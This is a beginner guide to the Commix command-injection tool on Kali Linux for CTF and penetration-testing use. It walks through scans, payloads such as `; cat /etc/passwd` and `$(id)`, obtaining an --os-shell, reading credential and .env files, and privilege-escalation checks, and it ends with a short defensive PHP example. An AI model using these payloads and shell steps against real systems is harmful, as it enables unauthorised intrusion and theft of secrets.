# Commix - Quick Guide for Kali Linux

## What is Commix?

**Commix** = **Comm**and **I**njection E**x**ploiter

It's an automated penetration testing tool that finds and exploits **command injection vulnerabilities** in web applications.

### What is Command Injection?

When a website executes system commands with user input without proper validation:

```bash
# Vulnerable code example:
system("ping " + user_input)

# If user enters: 8.8.8.8; cat /etc/passwd
# Server executes: ping 8.8.8.8; cat /etc/passwd
# Result: Attacker reads sensitive files!
```

---

## Installation

```bash
# Check if installed
commix --version

# If not installed
sudo apt update
sudo apt install commix -y
```

---

## Basic Usage

### 1. Simple Scan (Fastest)
```bash
commix --url="https://target.com/" --batch
```
- Tests the URL for command injection
- `--batch` = runs automatically without asking questions

### 2. Test Specific Parameter
```bash
commix --url="https://target.com/?id=INJECT_HERE" --batch
```
- `INJECT_HERE` tells commix where to inject payloads

### 3. Test POST Data
```bash
commix --url="https://target.com/api/test" --data="param=INJECT_HERE" --batch
```

### 4. Comprehensive Scan
```bash
commix --url="https://target.com/" --all --batch
```
- `--all` = tests all injection techniques

---

## How Commix Works

### Step 1: Detection
Commix sends payloads like:
```bash
`whoami`
$(id)
;ls;
|cat /etc/passwd|
```

### Step 2: Verification
If the server responds differently, it confirms vulnerability

### Step 3: Exploitation
Once found, you can:
- Execute commands
- Read files
- Get a shell
- Upload files

---

## Real Example

```bash
# Scan a website
commix --url="https://example.com/?search=test" --batch

# If vulnerable, commix shows:
[✓] The parameter 'search' is vulnerable to command injection!

# Get interactive shell
commix --url="https://example.com/?search=INJECT_HERE" --os-shell

# Now you have a shell:
commix> whoami
www-data

commix> ls
index.php
flag.txt
config.php

commix> cat flag.txt
CTF{command_injection_pwned}
```

---

## Common Commands After Getting Shell

```bash
# See who you are
whoami

# See your permissions
id

# List files
ls -la

# Read files
cat flag.txt
cat .env
cat config.php

# Find flag files
find / -name "*flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null

# See environment variables
env

# Check running processes
ps aux

# Network connections
netstat -tulpn
```

---

## Injection Techniques Commix Uses

### 1. Classic Injection
```bash
; whoami
| whoami
& whoami
```

### 2. Eval-Based
```bash
`whoami`
$(whoami)
```

### 3. Time-Based Blind
```bash
; sleep 5
$(sleep 5)
```
If response takes 5 seconds = vulnerable!

### 4. File-Based
```bash
; echo test > /tmp/test.txt
```
Writes file to confirm execution

---

## Useful Flags

```bash
--url="URL"              # Target URL
--batch                  # Non-interactive mode
--all                    # Test all techniques
--data="param=value"     # POST data
--cookie="session=xyz"   # Test cookies
--header="X-Custom: val" # Test headers
--os-shell               # Get interactive shell
--file-read="/etc/passwd" # Read specific file
--output-dir=./results   # Save results
```

---

## Complete Workflow

### Step 1: Reconnaissance
```bash
# Basic scan
commix --url="https://target.com/" --batch
```

### Step 2: If Vulnerable
```bash
# Get shell
commix --url="https://target.com/?param=INJECT_HERE" --os-shell
```

### Step 3: Exploitation
```bash
# In the shell:
whoami
id
ls -la
cat flag.txt
cat .env
find / -name "flag*" 2>/dev/null
```

### Step 4: Privilege Escalation (if needed)
```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check for exploits
uname -a
```

---

## Real CTF Example

```bash
# Target: https://ctf.example.com/search?q=test

# Step 1: Test for vulnerability
commix --url="https://ctf.example.com/search?q=INJECT_HERE" --batch

# Output:
[✓] Parameter 'q' is vulnerable!

# Step 2: Get shell
commix --url="https://ctf.example.com/search?q=INJECT_HERE" --os-shell

# Step 3: Find flag
commix> find / -name "flag*" 2>/dev/null
/home/ctf/flag.txt

commix> cat /home/ctf/flag.txt
CTF{c0mm4nd_1nj3ct10n_m4st3r}
```

---

## Why Use Commix?

### Manual Testing (Slow):
```bash
curl "https://target.com/?id=`whoami`"
curl "https://target.com/?id=$(id)"
curl "https://target.com/?id=;ls;"
# Test 100+ payloads manually...
```

### With Commix (Fast):
```bash
commix --url="https://target.com/?id=INJECT_HERE" --batch
# Tests everything automatically in seconds!
```

---

## Common Scenarios

### Scenario 1: Testing Login Form
```bash
commix --url="https://target.com/login" \
  --data="username=admin&password=INJECT_HERE" \
  --batch
```

### Scenario 2: Testing API
```bash
commix --url="https://target.com/api/user?id=INJECT_HERE" --batch
```

### Scenario 3: Testing Headers
```bash
commix --url="https://target.com/" \
  --header="User-Agent: INJECT_HERE" \
  --batch
```

### Scenario 4: Testing Cookies
```bash
commix --url="https://target.com/" \
  --cookie="session=INJECT_HERE" \
  --batch
```

---

## What Happens When Vulnerable?

### Before Commix:
```
Website: Normal functionality
Attacker: No access
```

### After Commix Finds Vulnerability:
```
Website: Still looks normal
Attacker: Can execute ANY command on server!
```

### What Attacker Can Do:
1. Read all files (source code, databases, secrets)
2. Steal user data
3. Modify/delete data
4. Install backdoors
5. Pivot to other systems
6. Steal API keys and credentials
7. Take complete control of server

---

## Defense Against Command Injection

### Bad Code (Vulnerable):
```php
<?php
$ip = $_GET['ip'];
system("ping " . $ip);  // DANGEROUS!
?>
```

### Good Code (Safe):
```php
<?php
$ip = $_GET['ip'];
// Validate input
if (preg_match('/^[0-9.]+$/', $ip)) {
    system("ping " . escapeshellarg($ip));
} else {
    die("Invalid IP");
}
?>
```

---

## Quick Reference Card

```bash
# Basic scan
commix --url="URL" --batch

# Test parameter
commix --url="URL?param=INJECT_HERE" --batch

# Get shell
commix --url="URL?param=INJECT_HERE" --os-shell

# Read file
commix --url="URL?param=INJECT_HERE" --file-read="/etc/passwd" --batch

# POST request
commix --url="URL" --data="param=INJECT_HERE" --batch

# Test all techniques
commix --url="URL" --all --batch
```

---

## Tips for CTF/Pentesting

1. **Always use --batch** for automation
2. **Save output** with `--output-dir`
3. **Test common parameters**: id, user, file, cmd, exec, command
4. **Look for flags in**:
   - `/flag.txt`
   - `/home/*/flag.txt`
   - `/root/flag.txt`
   - `.env` files
   - Environment variables (`env`)

5. **If commix doesn't find anything**, try manual testing:
   ```bash
   curl "URL?param=\`whoami\`"
   curl "URL?param=\$(id)"
   curl "URL?param=;ls;"
   ```

---

## Summary

**Commix** is like having an expert hacker automatically test for command injection vulnerabilities. Instead of manually trying hundreds of payloads, commix does it all in seconds and gives you a shell if successful.

**Think of it as**:
- SQLMap for SQL injection
- Commix for Command injection
- Both automate the boring parts of exploitation!

---

**Created for**: Kali Linux Users  
**Difficulty**: Beginner-Friendly  
**Time to Learn**: 10 minutes  
**Time to Master**: Practice on CTF challenges!

